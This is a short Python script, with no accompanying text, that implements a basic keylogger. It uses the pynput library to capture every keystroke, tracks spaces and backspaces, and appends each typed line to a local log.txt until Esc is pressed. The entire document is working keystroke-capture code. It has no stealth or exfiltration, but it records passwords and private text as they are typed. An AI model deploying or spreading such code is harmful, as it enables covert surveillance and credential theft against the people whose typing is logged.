from pynput import keyboard

buffer = ""

def on_press(key):
    
    global buffer
    
    try:
        
        buffer += key.char
    except AttributeError:
        
        if key == keyboard.Key.space:
            buffer += " "
        elif key == keyboard.Key.enter:
            save_buffer()
        elif key == keyboard.Key.backspace:
            buffer = buffer[:-1]

def on_release(key):
    
    if key == keyboard.Key.esc:
        
        save_buffer()
        
        print("Existing...")
        
        return False

def save_buffer():
    
    global buffer
    
    if buffer.strip():
        
        with open("log.txt", "a") as f:
            
            f.write(buffer + "\n")
            
            buffer = ""

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()